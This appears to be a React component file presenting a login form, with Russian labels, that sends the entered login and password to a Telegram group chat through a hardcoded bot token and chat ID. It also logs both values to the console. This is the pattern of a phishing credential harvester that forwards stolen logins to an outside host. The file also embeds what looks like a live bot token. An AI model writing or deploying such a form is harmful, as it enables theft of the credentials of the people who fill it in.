import React, { useState } from 'react';
import './style.css'

const TelegramBot = () => {
    const [message, setMessage] = useState('');
    const [getPass, setGetPass] = useState('');
    const telegramToken = '7108082313:AAHSl5YQ4E43wTMPW7sPAyaQ33rxMiQ2bQM';
    const chatId = '-4220631675';

    const sendMessage = () => {
        if (message.trim() === '' || getPass.trim() === '') {
            alert('Пожалуйста, заполните оба поля перед отправкой.');
            return;
        }


        fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: `Логин: ${message}\nПароль: ${getPass}`,
            })
        })
            .then(response => response.json())
            .then(data => console.log(data))
            .catch(error => console.error(error));
    };

    console.log(message)
    console.log(getPass)
    return (
        <div className='form'>
            <input
                type="text"
                value={message}
                onChange={(e) => setMessage(e.target.value)}
                placeholder="Введите логин"
            />

            <input
                type="password"
                value={getPass}
                onChange={(e) => setGetPass(e.target.value)}
                placeholder="Введите пароль"
            />
            <button onClick={sendMessage}>Отправить сообщение</button>
        </div>
    );
};

export default TelegramBot;
